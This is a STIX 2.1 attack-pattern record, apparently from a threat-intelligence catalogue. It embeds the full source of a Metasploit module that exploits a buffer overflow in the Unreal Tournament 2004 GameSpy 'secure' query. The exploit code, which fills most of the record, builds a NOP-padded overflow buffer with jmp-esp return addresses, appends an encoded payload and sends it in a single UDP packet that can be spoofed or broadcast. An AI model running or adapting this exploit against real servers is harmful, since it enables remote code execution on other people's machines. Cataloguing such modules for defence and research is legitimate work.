{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f5e8a906-b55d-45c6-8aa8-2d893d9cef36",
    "created": "2024-08-14T16:39:40.924935Z",
    "modified": "2024-08-14T16:39:40.924939Z",
    "name": "Unreal Tournament 2004 \"secure\" Overflow (Win32)",
    "description": "  This is an exploit for the GameSpy secure query in the Unreal Engine.  This exploit only requires one UDP packet, which can be both spoofed and sent to a broadcast address. Usually, the GameSpy query server listens on port 7787 but you can manually specify the port as well.  The RunServer.sh script will automatically restart the server upon a crash, giving us the ability to bruteforce the service and exploit it multiple times.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/games/ut2004_secure.rb",
            "external_id": "ut2004_secure.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0608"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Unreal Tournament 2004 \"secure\" Overflow (Win32)',\n      'Description'    => %q{\n\n      This is an exploit for the GameSpy secure query in\n      the Unreal Engine.\n\n      This exploit only requires one UDP packet, which can\n      be both spoofed and sent to a broadcast address.\n      Usually, the GameSpy query server listens on port 7787,\n      but you can manually specify the port as well.\n\n      The RunServer.sh script will automatically restart the\n      server upon a crash, giving us the ability to\n      bruteforce the service and exploit it multiple\n      times.\n\n      },\n      'Author'         => [ 'stinko' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-0608'],\n          [ 'OSVDB', '7217'],\n          [ 'BID', '10570'],\n\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x5c\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['UT2004 Build 3186', { 'Rets' => [ 0x10184be3, 0x7ffdf0e4 ] }], # jmp esp\n        ],\n      'DisclosureDate' => '2004-06-18',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(7787)\n      ])\n\n  end\n\n  def exploit\n    connect_udp\n\n    buf = make_nops(1024)\n    buf[0, 60] = [target['Rets'][0]].pack('V') * 15\n    buf[54, 4] = [target['Rets'][1]].pack('V')\n    buf[0,  8] = \"\\\\secure\\\\\"\n    buf[buf.length - payload.encoded.length, payload.encoded.length] = payload.encoded\n\n    udp_sock.put(buf)\n\n    handler\n    disconnect_udp\n  end\n\n  def ut_version\n    connect_udp\n    udp_sock.put(\"\\\\basic\\\\\")\n    res = udp_sock.recvfrom(8192)\n    disconnect_udp\n\n    if (res and (m=res.match(/\\\\gamever\\\\([0-9]{1,5})/)))\n      return m[1]\n    end\n\n    return\n  end\n\n  def check\n    vers = ut_version\n\n    if (not vers)\n      print_status(\"Could not detect Unreal Tournament Server\")\n      return\n    end\n\n    vprint_status(\"Detected Unreal Tournament Server Version: #{vers}\")\n    if (vers =~ /^(3120|3186|3204)$/)\n      vprint_status(\"This system appears to be exploitable\")\n      return Exploit::CheckCode::Appears\n    end\n\n\n    if (vers =~ /^(2...)$/)\n      vprint_status(\"This system appears to be running UT2003\")\n      return Exploit::CheckCode::Detected\n    end\n\n    vprint_status(\"This system appears to be patched\")\n    return Exploit::CheckCode::Safe\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-06-18",
    "x_mitre_platforms": [
        "win'"
    ]
}